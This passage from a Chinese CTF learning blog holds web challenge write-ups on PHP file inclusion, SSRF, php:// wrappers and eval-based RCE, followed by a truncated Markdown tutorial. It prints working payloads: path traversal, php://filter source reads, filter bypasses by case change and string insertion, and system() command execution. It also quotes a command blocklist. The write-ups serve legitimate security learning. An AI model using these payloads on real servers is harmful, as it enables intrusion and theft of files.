punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span> </code></pre></code></pre><ul><li>分析</li></ul><p>首先，看到个<code>hint.php</code>,传个<code>file=hint.php</code>得到的结果是：<code>flag not here, and flag in ffffllllaaaagggg</code>这个告诉了我们flag所在的文件名；      </p><p>分析一下为什么：第一个、第二个<code>if</code>可以过去，截取函数那里，先加个 ？ 然后截取第一个字符到 ？ ，还是<code>hint.php</code>;没有经过url编码，解码后还是那样；下面一个也一样；最后include函数包含并运行<code>hint.php</code>，得到其中的内容。             </p><p>接下来是include函数的利用：<img src="https://ftp.bmp.ovh/imgs/2021/01/5ef880466d9cffdb.png"></p><ul><li>解决</li></ul><p>传参：<code>file=hint.php?/../../../../../../ffffllllaaaagggg</code><br>得到flag；其中<code>file=hint.php?/</code>将其当作文件夹，<code>../</code>到上一级目录，最少四个，因为一般Web服务的文件夹在<code>/var/www/html</code>目录中，再加上<code>source.php?/</code>这个“文件夹”，所以我们总共需要<code>../</code>四次来返回到根目录,从而打开文件，得到flag。<img src="https://ftp.bmp.ovh/imgs/2021/01/8875ef30b6a63f6e.png"></p><ul><li>知识点           <blockquote><ul><li><code>in_array</code>函数：检查数组中是否存在某个值<br>语法：````in_arry(mixed $needle,arry $haystack,bool $strict =false):bool ``<br>如果没有设置$strick=true,将比较类型是否相同<br>mixed的意思是可以为任意类型<br>如果needle是字符串，则比较是区分大小写的<br>如果找到needle则返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.in-array.php">MORE</a> </li><li><code>mb_substr</code>函数：返回字符串的一部分，<code>substr()</code>函数只针对英文字符，<code>mb_substr</code>还支持中文文字<br>语法：<code>mb_substr ( string $str , int $start , int $length = NULL , string $encoding = mb_internal_encoding() ) : string</code><br>$str:提取目标<br>$start:开始提取的位置；负数的话从尾处第start个字符开始<br>$length ：提取长度；如果省略或传入NULL，则会提取到尾部<br>$encoding: 为字符编码；如果省略或是NULL，则使用内部字符编码。<br>返回值：提取到的字符<br><a href="https://www.php.net/manual/zh/function.mb-substr.php">MORE</a>          </li><li>is_string函数：检测变量是否是字符串。<br><a href="https://www.php.net/manual/zh/function.is-string.php">MORE</a>                       </li><li><code>mb_strpos</code>函数：查找字符串在另一个字符串中首次出现的位置<br>语法：<code>mb_strpos ( string $haystack , string $needle , int $offset = 0 , string $encoding = mb_internal_encoding() ) : int</code><br>第一个字符的位置是 0，第二个字符的位置是 1，以此类推。<br>$offset: 搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。<br><a href="https://www.php.net/manual/zh/function.mb-strpos.php">MORE</a></li></ul></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF--WP</title>
    <link href="/2020/12/06/SSRFWP/"/>
    <url>/2020/12/06/SSRFWP/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRF–WP"><a href="#SSRF–WP" class="headerlink" title="SSRF–WP"></a>SSRF–WP</h2><p>题目：        </p><pre><code>            啊这，这怎么...这file_get_contents()有啥用呢&lt;?php    echo&#39;&lt;center&gt;&lt;strong&gt;啊这，这怎么...这file_get_contents()有啥用呢&lt;/strong&gt;&lt;/center&gt;&#39;;    highlight_file(__FILE__);    $url =$_GET [&#39;url&#39;];    if (preg_match(&#39;/dotnet\.com/&#39;, $url))&#123;        if(!preg_match(&#39;/php|file|zip|bzip|zlib|base|data/i&#39;, $url)) &#123;            echo (file_get_contents($url));        &#125;        else &#123;            echo(&#39;没看到过滤了吗...&#39;);        &#125;    &#125;    else&#123;        echo (&quot;这个怎么绕过呢？&quot;) ;    &#125;//flag is in &#39;/flag&#39;?&gt;这个怎么绕过呢？          </code></pre><p>第一个<code>preg_match</code>意思是$url中必须包含<code>dotnet.com</code>;<br>第二个<code>!preg_match</code>意思是不能匹配到其中的字符，有<strong>i</strong>，包含大小写，这样就把伪协议的路堵死了。<br>这个dotnet.com似乎没有什么用，就可以在后面加个@进行绕过：<br><code>dotnet.com@123=123</code><br>既然伪协议的路没法走，然后去找<code>file_get_contents</code>相关的知识，原来PHP还可以进行目录穿越：<br><strong>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。<br>所以我们就可以构造的payload(php如果识别不了就会当成一个目录)在进行目录穿越，穿越到根目录读取flag</strong><br>payload:<code>/?url=dotnet.com@0://../../../../../../../../flag</code><br>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2020/12/fe21b3b3e2b74d5c.png">             </p><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><blockquote><ul><li><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。          </p></li><li><p>SSRF中的绕过过滤：<br>@绕过：<a href="http://www.baidu.com@127.0.0.1=127.0.0.1/">http://www.baidu.com@127.0.0.1=127.0.0.1</a><br>将IP地址转换成十进制、八进制、十六进制：192.168.0.1&gt;&gt;&gt;&gt;0300.0250.0.1(八进制)</p></li><li><p>.xip.io：       </p><blockquote><p>192.168.0.1.xip.io&gt;&gt;&gt;192.168.0.1<br><a href="http://www.10.0.0.1.xip.io/">www.10.0.0.1.xip.io</a> = 10.0.0.1<br>mysite.10.0.0.1.xip.io = 10.0.0.1<br>foo.bar.10.0.0.1.xip.io = 10.0.0.1            </p></blockquote></li><li><p>端口绕过：127.0.0.1&gt;&gt;&gt;127.0.0.1: 80        </p></li><li><p>目录穿越：php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录</p></li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Php伪协议</title>
    <link href="/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><ul><li>PHP伪协议事实上就是支持的协议与封装协议。</li><li>首先，介绍一些CTF中常见的文件包含函数：<ul><li>1.include：包含并对给定的文件进行计算。</li><li>2.require：用于引入或者包含外部php文件。<blockquote><p>include和require的区别：include引入文件报错后会继续执行代码，而require引入文件时，遇到错误后就会停止运行下面的代码。        </p></blockquote></li><li>3.include_once:包含并运行指定文件，与include的区别是这个只能包含一次。</li><li>4.require_once:与require相同，区别也是包含一次。</li><li>5.highlight_file：语法高亮一个文件。</li><li>6.show_source：这是highlight_file的别名。</li><li>7.readfile：输出文件，成功时返回从文件中读入的字节数。</li><li>8.file_get_contents ：将整个文件读入一个字符串。</li><li>9.fopen：打开文件或者URL。</li><li>10.file：把整个文件读入一个数组中。</li></ul></li></ul><hr><ul><li><strong>file://协议</strong>          <blockquote><p>用于访问本地文件系统，CTF中通常用来读取文件<br>file://+文件的绝对路径和文件名<br>file://+文件的相对路径和文件名<br>file://+文件的网络路径和文件名             </p></blockquote><hr></li><li>  <strong>php://协议</strong>      <blockquote><p>用于访问各个输入/输出流，在CTF中经常使用php://filter来读取一个文件的源码，使用php://input来执行PHP代码。<br>php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST中的data<br>php://output:允许以print和echo一样的方式写入到输出缓冲区<br>php://fd:允许直接访问指定的文件描述符<br>php://memory   php://temp:文件包装器的数据流，允许读写临时数据。<br>php://filter:一种原封装器，设计用于数据流打开时的筛选过滤应用。       </p><blockquote><p>相关参数：<br>resource=&lt;要过滤的数据流&gt;<br>read=&lt;读链的过滤器&gt;<br>write=&lt;写链的过滤器&gt;<br>&lt;;两个链的过滤器&gt;任何没有以read=或write=做前缀的筛选器列表会视情况应用于读或写链     </p><blockquote><p>字符串过滤器<br>string.rot13:rot13变换<br>string.toupper:转大写字母<br>string.tolower:转小写字母<br>string.strip_tags:去除html、php语言标签<br>转换过滤器<br>conver.base64-encode&amp;convert.base64-decode:base64编码解码<br>convert.quoted-printable-encode&amp;canvert.quoted-printable-decode:quoted-printable字符串与8-bit字符串编码解码<br>还用压缩过滤器和加密过滤器，感觉用不到，以后见到相关题再写吧<br>伪协议题常用的两句话：php://filter/read=convert.base64-encode/resource=[文件名]<br>php://input+[POST DATA]执行PHP代码      </p></blockquote></blockquote></blockquote></li></ul><hr><blockquote><p>zip://&amp;bzip://&amp;zlib://协议<br>作用：他们都是压缩流，可以访问压缩文件中的子文件</p></blockquote><hr><p>感觉一堆文字好可怕啊，等把PHP弄好后，自己能实现这些协议后再完善吧~~~</p>]]></content>
    
    
    <categories>
      
      <category>NOTE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NOTE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku刷题记录</title>
    <link href="/2020/12/04/bugku/"/>
    <url>/2020/12/04/bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="bugku–wp"><a href="#bugku–wp" class="headerlink" title="bugku–wp"></a>bugku–wp</h1><hr><h2 id="1-web2"><a href="#1-web2" class="headerlink" title="1.web2"></a>1.web2</h2><p>打开题目地址，F12查看源码的到flag。 </p><hr><h2 id="2-计算器"><a href="#2-计算器" class="headerlink" title="2.计算器"></a>2.计算器</h2><p>数学题计算，输入结果发现只能输入一个数字，应该是限制了长度，修改源码后重新提交，得到flag。         </p><hr><h2 id="3-web基础-GET"><a href="#3-web基础-GET" class="headerlink" title="3.web基础$_GET"></a>3.web基础$_GET</h2><p>URL中输入what=flag得到flag。        </p><hr><h2 id="4-web基础-amp-POST"><a href="#4-web基础-amp-POST" class="headerlink" title="4.web基础&amp;_POST"></a>4.web基础&amp;_POST</h2><p>用hackbar提交what=flag得到flag。   </p><hr><h2 id="5-矛盾"><a href="#5-矛盾" class="headerlink" title="5.矛盾"></a>5.矛盾</h2><p><img src="https://ftp.bmp.ovh/imgs/2020/12/47c19a360df3b2fc.png"><br>is_numeric() 函数用于检测变量是否为数字或数字字符串。<br>题目的意思是$num的值为1，但不是数字，PHP是弱类型语言，==进行转换时会把字符串转换成第一位，所以传入num=1aa，得到flag。  </p><hr><h2 id="6-web3"><a href="#6-web3" class="headerlink" title="6.web3"></a>6.web3</h2><p><img src="https://ftp.bmp.ovh/imgs/2020/12/3e9fed55d2d084fd.png"><br>不知道该怎么办，F12发现啥也没有，将阻止页面创建对话框勾选上，再次F12得到一串Unicode编码，解码得到flag。       </p><hr><h2 id="7-域名解析"><a href="#7-域名解析" class="headerlink" title="7.域名解析"></a>7.域名解析</h2><p><img src="https://ftp.bmp.ovh/imgs/2020/12/39ef3bd33297fc5c.png"><br>不知道啥是域名解析，网上搜了一大堆都是买域名什么的，还是直接去看别人的wp吧。<br>将C:\Windows\System32\drivers\etc这个路径下的hosts文件末尾加上 123.206.87.240 flag.baidu.com 然后浏览器打flag.baidu.com<br>就能看到flag了。<br>关于域名解析：域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。      </p><p>Windows中hosts文件的作用：将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。       </p><p>对于hosts文件的修改会出现ctrl+s后会保存为另一个文件，解决办法：<br>进入hosts的目录后：<img src="https://ftp.bmp.ovh/imgs/2020/12/081b9deac349513a.png"><br>输入cmd，进入管理员管理界面，再输入notepad hosts，回车后弹出hosts文件，修改后CTRL+s保存即可。</p><hr><h2 id="8-你必须让他停下来"><a href="#8-你必须让他停下来" class="headerlink" title="8.你必须让他停下来"></a>8.你必须让他停下来</h2><p>打开题目地址后发现一直在刷新，F12查看源代码后发现每次刷新都会是不同的图片，burp抓包看看吧，不断send后得到flag<br> <img src="https://ftp.bmp.ovh/imgs/2020/12/beefc7458013777d.png">          </p><hr><h2 id="9-本地包含"><a href="#9-本地包含" class="headerlink" title="9.本地包含"></a>9.本地包含</h2><p>这道题的网站好像坏了，打开后什么也没有，抓包，御剑都试了，什么也没有，看别人以前的WP是有一段PHP代码的。 </p><hr><h2 id="10-变量1"><a href="#10-变量1" class="headerlink" title="10.变量1"></a>10.变量1</h2><p>首先代码审计               </p><pre><code><pre class="language-php" data-language="php"><code class="language-php">flag In the variable !     ////flag在一个变量中<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token comment">////正则表达式，意思是如果字符串不是全部由字母（包含大小写），数字，下划线组成的，就会输出 args error!</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"var_dump(<span class="token interpolation"><span class="token variable">$$args</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">////$$args可变变量，将$args作为变量。</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>               </code></pre></code></pre><p>所以什么能够将变量显示出来呢，答案是全局变量 GLOBALS<br>$GLOBALS — 引用全局作用域中可用的全部变量<br>输入 args=GLOBALS 得到flag。<br><img src="https://ftp.bmp.ovh/imgs/2020/12/136889d8f52006b5.png"></p><h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul><li>首先是preg_match那一段，注意还有个 ！ ，       </li><li>两个//表示开始和结束，</li><li>^表示开始字符串，</li><li>$表示结束字符串，</li><li>\w表示包含【a-z，A-Z, _ , 0-9】，</li><li>+表示一个或者多个\w。</li><li>注意是字符串 全部 【a-z，A-Z, _ , 0-9】这些组成才true。        </li><li>还有就是那个带两个美元符号的可变变量。</li><li>全局变量：</li><li>$GLOBALS — 引用全局作用域中可用的全部变量。</li><li>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息。</li><li>REQUEST\GET\POST也都是全局变量。            </li><li><hr><h2 id="11-web5"><a href="#11-web5" class="headerlink" title="11.web5"></a>11.web5</h2><img src="https://ftp.bmp.ovh/imgs/2020/12/5b59308e8f0baff2.png"><br>F12后看到一堆奇怪的符号，根据题目提示应该是 JSPFUCK 编码；解码方法：将其复制粘贴到控制台后回车，得到flag<br><img src="https://ftp.bmp.ovh/imgs/2020/12/4341596e2726364f.png"><br>注意题目要求，提交时字母大写！！<br>jjencode、aaencode这两个也可以用此方法解码。<br>jjencode:<img src="https://ftp.bmp.ovh/imgs/2020/12/4c6f2b82c79f2d09.png"><br>aaencode:<img src="https://ftp.bmp.ovh/imgs/2020/12/8331e5413d3b5f56.png"></li></ul><hr><h2 id="12-头等舱"><a href="#12-头等舱" class="headerlink" title="12.头等舱"></a>12.头等舱</h2><p>打开地址后，页面上写有什么也没有几个字，不知道啥意思，御剑，burp一起上，发现send后得到flag。<br> <img src="https://ftp.bmp.ovh/imgs/2020/12/1b08738f709f6956.png"></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪协议--WP</title>
    <link href="/2020/12/03/wxyWP/"/>
    <url>/2020/12/03/wxyWP/</url>
    
    <content type="html"><![CDATA[<h2 id="伪协议1"><a href="#伪协议1" class="headerlink" title="伪协议1"></a>伪协议1</h2><p>题目：</p><pre><code>                    针不戳，吃柠檬的感觉针不戳    &lt;?php    error_reporting(0);    echo &#39;&lt;center&gt;&lt;strong&gt;针不戳，吃柠檬的感觉针不戳&lt;/strong&gt;&lt;/center&gt;&#39;;    highlight_file(__FILE__);    $file=$_GET[&#39;file&#39;];    if (isset($file))&#123;        if(preg_match(&#39;/php|file|zip|bzip|zlib|base|data/&#39;,$file))&#123;            echo (&#39;hacker!!!&#39;);        &#125;else &#123;            include $file;          ////include 语句包含并运行指定文件。        &#125;    &#125;    #不对劲，总感觉写错了啥，算了，先去吃柠檬~    ?&gt; </code></pre><p>这次的题目值得注意的是这个<code>preg_match</code>函数中没有 <strong>i</strong>，也就是说这个正则匹配是区分大小写的，所以将涉及到的过滤的词换成大写即可。<br>根据题目，或者根据  <code>include $file</code> 判断这是一道伪协议题，url中输入<code> ?file=Php://filter/read=convert.Base64-encode/resource=flag.php</code> ,什么也没有，把<code>.php</code>删了，回车得到一段base64编码：<br><img src="https://ftp.bmp.ovh/imgs/2020/12/eb3a088303494cf6.png"></p><p>解码后得到flag：<br><img src="https://ftp.bmp.ovh/imgs/2020/12/34b02328261e3877.png"><br>这里的flag包含在flag文件里我是猜的，但弄了好一会儿还是不知道怎么知道flag包含在这个文件里，问了徐神后说，这就是猜的············<br>好吧，看来还是我做题的经验不够啊。<br>至于为什么flag文件没有后缀，因为Linux中文件可以没有扩展名，出题应该就是在Linux下出的吧。          </p><hr><h2 id="伪协议2"><a href="#伪协议2" class="headerlink" title="伪协议2"></a>伪协议2</h2><p>题目：</p><pre><code>                针不戳，吃柠檬的感觉针不戳    &lt;?php    error_reporting(0);    echo &#39;&lt;center&gt;&lt;strong&gt;针不戳，吃柠檬的感觉针不戳&lt;/strong&gt;&lt;/center&gt;&#39;;    highlight_file(__FILE__);    $file=$_GET[&#39;file&#39;];    if (isset($file))&#123;        if(preg_match(&#39;/php|file|zip|bzip|zlib|base|data/i&#39;,$file))&#123;            echo (&#39;hacker!!!&#39;);        &#125;else &#123;            $a=str_replace(&quot;troye&quot;,&quot;&quot;,$file);       ////str_replace替换函数，意思是将$file中的troye替换没有。            include $a;        &#125;    &#125;    #不对劲，总感觉写错了啥，算了,继续吃柠檬~    ?&gt; </code></pre><p>这一次<code>preg_match</code>函数中加上了<strong>i</strong>，区分大小写了，但下面的<code>str_replace</code>函数提供了另一种绕过方式，所以可以将<code>preg_match</code>过滤的词中插入troye便可绕过输入<code>?file=ptroyehp://filter/read=convert.btroyease64-encode/resource=flag</code>得到base64编码：<img src="https://ftp.bmp.ovh/imgs/2020/12/2cf1778026b759e0.png"><br>解码后得到flag：<br><img src="https://ftp.bmp.ovh/imgs/2020/12/579dbc421b42e0a4.png">        </p><hr><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><blockquote><p><code>include</code>函数：包含并对给定的文件进行计算。<br><code>str_replace</code>函数：替换字符串中的一些字符（区分大小写）。而 <code>str_ireplace() </code>函数执行不区分大小写的搜索。<br>CTF伪协议常用的两句话：<br><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码<br><code>php://input+[POST DATA]</code>  执行PHP代码</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic Rce---WP</title>
    <link href="/2020/11/28/RCEWP/"/>
    <url>/2020/11/28/RCEWP/</url>
    
    <content type="html"><![CDATA[<h1 id="basic-rce1——wp"><a href="#basic-rce1——wp" class="headerlink" title="basic rce1——wp"></a>basic rce1——wp</h1><p>首先进行代码审计：</p><pre><code>&lt;?php//拿到flag就不要乱玩了哦~error_reporting(0);     //php函数，关闭错误报告show_source(__FILE__);   //该函数对文件进行语法高亮显示，应该就是让PHP代码能够在HTML页面上显示。eval($_GET[&#39;a&#39;]);   //首先，eval()函数，把字符串按照PHP代码来计算，该字符串必须是合法的PHP代码，即以分号结尾；括号里就是以GET的方式输入a.?&gt;    </code></pre><p>整个题目就是这样了，但是一点flag的影子都没有，结合eval()函数，猜想应该是通过一段代码将flag显示出来，所以首先应该要知道包含flag的文件名，system()函数可以执行系统命令。<br>system(‘ls’)一下，注意：不要忘记单引号！！！！！<br><img src="https://ftp.bmp.ovh/imgs/2020/11/d7d0a05f4b5bb4e7.png"><br>知道了文件名f111a9.php，接下来就用命令打开它，打开文件的命令有：<br><img src="https://ftp.bmp.ovh/imgs/2020/11/f86c87a349a74379.png"><br>逐个试了一下，发现只有 tac 可以得到flag：<br><img src="https://ftp.bmp.ovh/imgs/2020/11/1c5262a8578d0993.png">          </p><hr><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><ul><li>eval()函数：将字符串按照代码计算。（代码执行）（一句话木马）</li><li>system()函数：命令执行。    <h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2></li><li>代码执行和命令执行的区别：代码执行实际上就是调用服务器网站代码进行执行；而命令执行是通过易受攻击的应用在主机上执行任意命令。<pre><code>* 如：       &lt;?php         </code></pre>  eval(“echo 1+1;”);    //2<br>  system(“echo 1+1;”);  //1+1;               <pre><code>?&gt;</code></pre></li></ul><p>虽然还是有点不太理解，等以后深入学习应该就懂了吧。      </p><ul><li><p>为什么只有 tac 可以得到flag    </p><ul><li> 猜想：文件中有空行，因为执行system(‘cat -n f111a9.php’);命令后输出 1 4 ，表示只有一四行有输出内容。其他的就不知道为什么得不到了。       </li></ul></li><li><hr><h1 id="basic-rce2——wp"><a href="#basic-rce2——wp" class="headerlink" title="basic rce2——wp"></a>basic rce2——wp</h1><p>代码审计：   </p><pre><code> &lt;?php                 //flag in flag                 error_ reporting(0);               show_source(__FILE__);                    if (isset($_GET[&#39;Rem&#39;]))&#123;       ////isset() 函数用于检测变量是否已设置并且非 NULL。          $Ram=$_GET[&#39;Rem&#39;];      ////将GET到的Rem赋给Ram            if(preg_match(&quot;/(more|less|flag|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i&quot;, $Ram))&#123;         die(&quot;&lt;strong&gt;&lt;center&gt;总之就是非常可爱&lt;/center&gt;&lt;/strong&gt;&quot;);                            &#125;                               ////GET到的Rem变量不能包含上面的词，符号,否则会输出“总之就是非常可爱”，而不会执行下面的代码     $a = eval($Ram);               &#125;else&#123;                 echo &quot;&lt;script&gt;alert(&#39;爬爬爬我最会爬了&#39;)&lt;/script&gt;&quot;;            &#125;</code></pre></li></ul><p>首先整段代码没有输出flag的语句，也没有包含flag的文件名，和上一题差不多，只不过这一题要涉及到preg_match()函数的绕过，还是先sysytem(‘ls’);查看一下文件名：<br><img src="https://ftp.bmp.ovh/imgs/2020/11/7b1689d1b2425481.png"><br>preg_match()函数用取反绕过，将命令取反url编码：<img src="https://ftp.bmp.ovh/imgs/2020/11/a4396685470b825d.png"><br>输入得到flag：<br><img src="https://ftp.bmp.ovh/imgs/2020/11/69ce879a72e63742.png">  </p><hr><h2 id="知识点总结-1"><a href="#知识点总结-1" class="headerlink" title="知识点总结"></a>知识点总结</h2><ul><li>isset() 函数用于检测变量是否已设置并且非 NULL。</li><li>PHP 中的 preg_match() 函数可以根据正则表达式对字符串进行搜索匹配。题中的 <strong>|</strong> 意思是 <strong>或</strong> ；末尾的 <strong>i</strong> 意思是 <strong>不区分大小写</strong></li><li>这道题用的是preg_match的取反绕过，还有一些其他绕过方式，附上博客园一位大佬写的总结<br><a href="https://www.cnblogs.com/v01cano/p/11736722.html">https://www.cnblogs.com/v01cano/p/11736722.html</a>      </li><li><code>&lt;script&gt;&lt;/script&gt;</code>是HTML的一对标签,用于定义客户端脚本。</li></ul>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MarkDown基本使用</title>
    <link href="/2020/11/26/MarkDown/"/>
    <url>/2020/11/26/MarkDown/</url>
    
    <content type="html"><![CDATA[<h2 id="Markdown标题"><a href="#Markdown标题" class="headerlink" title="Markdown标题"></a>Markdown标题</h2><p>两种格式：<br>1、使用=和-标记一二级标题<br>一级标题<br>=============<br>二级标题   </p><hr><p>2、使用#号，表示1~6级标题       </p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>…………    </p><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><h2 id="Markdown段落"><a href="#Markdown段落" class="headerlink" title="Markdown段落"></a>Markdown段落</h2><p>换行：两个以上空格加上回车  或者 使用空行来换行    </p><hr><h2 id="Markdown字体"><a href="#Markdown字体" class="headerlink" title="Markdown字体"></a>Markdown字体</h2><p>1、将文本插入到两个星号（**）或两个下划线（__）表示斜体字。<br>2、将文本插入到四个星号中间或者四个下划线中间表示粗体字。<br>3、将文本插入到六个星号或下划线中间表示粗斜体字。   </p><hr><h2 id="Markdown分隔线"><a href="#Markdown分隔线" class="headerlink" title="Markdown分隔线"></a>Markdown分隔线</h2><p>一行星号***或——-    </p><hr><h2 id="Markdown删除线"><a href="#Markdown删除线" class="headerlink" title="Markdown删除线"></a>Markdown删除线</h2><p>在将要删除的文字两端加上两个波浪线,…………似乎不行啊，但是可以用HTML标签<code>&lt;del&gt;&lt;/del&gt;</code><br><del>llll-nnnnn</del>    </p><hr><h2 id="Markdown下划线"><a href="#Markdown下划线" class="headerlink" title="Markdown下划线"></a>Markdown下划线</h2><p>通过HTML标签<code>&lt;u&gt;&lt;/u&gt;</code><br><u>llll-nnnn</u>   </p><hr><h2 id="Markdown脚注"><a href="#Markdown脚注" class="headerlink" title="Markdown脚注"></a>Markdown脚注</h2><p>格式：<code>[^注明文本]</code><br>[^lll-nnn]<br>[^lll-nnn]: myself</p><hr><h2 id="Markdown列表"><a href="#Markdown列表" class="headerlink" title="Markdown列表"></a>Markdown列表</h2><p>星号（*）、加号（+）、减号（-）作为列表标记，标记后面加一个空格再填写内容。     </p><ul><li><p>1</p></li><li><p>2</p></li></ul><ul><li>3   <h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3>在子列表前面加四个空格。   </li></ul><ul><li>第一项 <ul><li>第一项嵌套的第一个元素</li><li>第一项嵌套的第二个元素     <h4 id="列表中使用区块"><a href="#列表中使用区块" class="headerlink" title="列表中使用区块"></a>列表中使用区块</h4></li></ul></li><li>123   <blockquote><p>123<br>456     </p></blockquote></li></ul><hr><h2 id="Markdown区块"><a href="#Markdown区块" class="headerlink" title="Markdown区块"></a>Markdown区块</h2><p>使用<code>&gt;</code>符号，后面一个空格。    </p><blockquote><p>区块1<br>区块2<br>区块3     </p></blockquote><h3 id="区块嵌套"><a href="#区块嵌套" class="headerlink" title="区块嵌套"></a>区块嵌套</h3><blockquote><p>第一层    </p><blockquote><p>第二层    </p><blockquote><p>第三层     </p></blockquote></blockquote></blockquote><h4 id="区块中使用列表"><a href="#区块中使用列表" class="headerlink" title="区块中使用列表"></a>区块中使用列表</h4><p>区块符号后面加上列表符号即可。</p><blockquote><p>区块中的列表       </p><ul><li> 第一项    </li><li> 第二项</li></ul></blockquote><hr><h2 id="Markdown代码"><a href="#Markdown代码" class="headerlink" title="Markdown代码"></a>Markdown代码</h2><p>句子中插入代码，将代码用反引号（`）包起来。<br>整段代码，也可使用四个空格或者一个制表符（Tab）。    </p><hr><h2 id="Markdown链接"><a href="#Markdown链接" class="headerlink" title="Markdown链接"></a>Markdown链接</h2><p><code>[链接名称](链接地址)</code><br>或者<br><code>&lt;链接地址&gt;</code><br><a href="https://lll-nnn.github.io/">lll-nnn</a><br>也可以使用变量赋值的方法 链接        </p><p><code>         这是我的博客[lll-nnn][1]。               [1]: 